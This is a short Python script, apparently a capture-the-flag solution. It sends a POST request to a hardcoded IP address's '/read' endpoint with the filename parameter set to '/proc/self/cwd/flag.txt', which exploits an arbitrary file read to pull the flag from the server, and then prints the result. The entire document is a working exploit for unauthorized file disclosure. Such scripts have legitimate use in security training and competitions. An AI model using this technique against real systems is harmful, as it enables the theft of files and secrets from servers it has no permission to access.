from requests import *
URL="http://192.214.171.83:4002/read"

data={'filename':'/proc/self/cwd/flag.txt'}

r=post(URL,data=data)

print(f"flag = {r.text}")